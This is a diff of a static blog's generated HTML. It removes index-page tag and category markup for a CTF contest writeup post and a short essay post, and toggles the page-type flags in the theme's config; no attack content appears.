-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">第五空间</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/CTF//" class="article-tag-list-link color4">CTF</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/06/24/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWEB%E9%83%A8%E5%88%86writeup/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Never-Rarely-Sometimes-Always" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/06/19/Never-Rarely-Sometimes-Always/">Never Rarely Sometimes Always</a>
-    </h1>
-  
-
-        
-        <a href="/2020/06/19/Never-Rarely-Sometimes-Always/" class="archive-article-date">
-  	<time datetime="2020-06-18T16:53:05.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-06-19</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>Never Rarely Sometimes Always </p>
-
-      
-
-	
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">随笔</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/随笔//" class="article-tag-list-link color3">随笔</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/06/19/Never-Rarely-Sometimes-Always/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
   
 
 
@@ -723,8 +448,8 @@
     <script>
 	var yiliaConfig = {
 		mathjax: false,
-		isHome: true,
-		isPost: false,
+		isHome: false,
+		isPost: true,
 		isArchive: false,
 		isTag: false,
 		isCategory: false,
